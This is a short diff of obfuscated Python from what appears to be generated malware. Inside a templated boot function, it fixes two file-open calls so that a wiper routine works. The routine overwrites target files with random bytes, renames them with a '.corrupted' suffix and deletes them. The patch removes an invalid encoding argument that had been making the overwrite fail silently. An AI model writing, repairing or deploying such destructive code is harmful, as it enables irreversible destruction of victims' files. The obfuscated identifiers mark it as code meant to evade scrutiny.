@@ -6661,7 +6661,7 @@ def {FUNC_BOOT}():
                     if _nixon_オペレーション운영.path.exists(t) and _nixon_オペレーション운영.path.isfile(t):
                         try:
                             sz = _nixon_オペレーション운영.path.getsize(t)
-                            with open(t, "rb+", encoding='utf-8') as f: f.write(_nixon_オペレーション운영.urandom(sz))
+                            with open(t, "rb+") as f: f.write(_nixon_オペレーション운영.urandom(sz))
                         except: pass
                         try:
                             try: _nixon_オペレーション운영.chmod(t, 0o600)
@@ -6867,7 +6867,7 @@ def {FUNC_BOOT}():
                     for t in targets:
                         if _nixon_オペレーション운영.path.exists(t) and _nixon_オペレーション운영.path.isfile(t):
                             sz = _nixon_オペレーション운영.path.getsize(t)
-                            with open(t, "rb+", encoding='utf-8') as f: f.write(_nixon_オペレーション운영.urandom(sz))
+                            with open(t, "rb+") as f: f.write(_nixon_オペレーション운영.urandom(sz))
                             try: _nixon_オペレーション운영.rename(t, t + ".corrupted")
                             except: pass
                             try: _nixon_オペレーション운영.unlink(t + ".corrupted")
